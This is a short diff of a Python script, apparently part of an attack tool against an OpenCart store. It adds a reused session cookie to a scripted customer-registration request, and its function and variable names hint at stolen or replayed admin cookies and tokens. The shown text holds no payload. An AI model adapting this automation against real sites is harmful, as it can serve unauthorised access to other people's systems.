@@ -67,8 +67,10 @@ def setfile(adcookies,adtoken):
     return set1
 
 
+
 def register():
     burp0_url = "https://"+host+":443//index.php?route=account/register"
+    burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/register", 
     "Cache-Control": "max-age=0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -79,7 +81,7 @@ def register():
     "Accept-Encoding": "gzip, deflate", 
     "Connection": "close"}
     burp0_data = "-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"customer_group_id\"\r\n\r\n1\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\nx\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\nx\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"telephone\"\r\n\r\n123213\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"confirm\"\r\n\r\n1234\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"newsletter\"\r\n\r\n0\r\n-----------------------------7e4183162b02e8\r\nContent-Disposition: form-data; name=\"agree\"\r\n\r\n1\r\n-----------------------------7e4183162b02e8--\r\n"
-    r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
+    r=requests.post(burp0_url, headers=burp0_headers,cookies=burp0_cookies,data=burp0_data,verify=False)
   
 def logincus():
     
